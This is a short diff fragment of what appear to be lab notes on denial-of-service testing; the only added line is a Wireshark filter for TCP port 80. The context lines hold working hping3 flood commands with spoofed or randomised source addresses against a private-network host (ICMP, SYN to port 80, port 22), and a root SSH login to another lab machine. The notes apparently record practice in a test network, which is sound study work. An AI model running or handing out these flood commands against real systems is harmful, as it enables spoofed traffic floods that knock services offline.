@@ -91,6 +91,8 @@ For icmp -> hping3 –flood -a 7.7.7.7 -1 -p 6234 192.168.8.164
 For port 80 -> hping3 -S -a 7.7.7.7 –flood -p 80 192.168.8.164
 Ssh root@192.168.8.38 -X
 For random IP -> hping3 –flood –rand-source -1 -p 22 192.168.8.164
+tcp.port==80
+
 
 
 
